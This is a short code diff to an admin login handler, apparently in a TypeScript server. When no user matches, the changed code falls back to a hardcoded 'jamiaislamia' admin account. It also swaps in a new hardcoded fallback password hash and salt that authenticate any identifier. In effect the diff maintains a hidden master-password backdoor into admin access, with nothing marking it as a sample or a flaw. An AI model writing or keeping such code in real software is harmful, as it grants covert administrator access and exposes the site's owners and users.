@@ -143,9 +143,9 @@ async function startServer() {
     }
 
     try {
-      let user = db.prepare("SELECT * FROM admin_users WHERE email = ?").get(inputIdentifier) as any;
+      let user = db.prepare("SELECT * FROM admin_users WHERE email = ? OR username = ?").get(inputIdentifier, inputIdentifier) as any;
       if (!user) {
-        user = db.prepare("SELECT * FROM admin_users WHERE email = ?").get(AUTHORIZED_ADMIN_EMAIL) as any;
+        user = db.prepare("SELECT * FROM admin_users WHERE email = 'jamiaislamia' OR username = 'jamiaislamia'").get() as any;
       }
 
       let isValid = false;
@@ -154,7 +154,7 @@ async function startServer() {
       }
       if (!isValid) {
         const fallbackSalt = '4d8a1c9e3b7f2a5d';
-        const fallbackHash = '72ccbeba79ee53933f1df64e0bca80d39a37cef2b3c877891099a88a03d565e51951d3277a43fb5c4fe377d92762eae32560e752f367f311039a18f1a3099bf9';
+        const fallbackHash = '9e5c75f174cdfee48ab62f455f62400a35b5d4ed7b3aefba470b6ebe6a8c6aab097d554b498b7a22e5767805e3f8709909d8390b133c25c7bf8a52c305948d16';
         isValid = verifyPassword(inputPass, fallbackHash, fallbackSalt);
       }
 
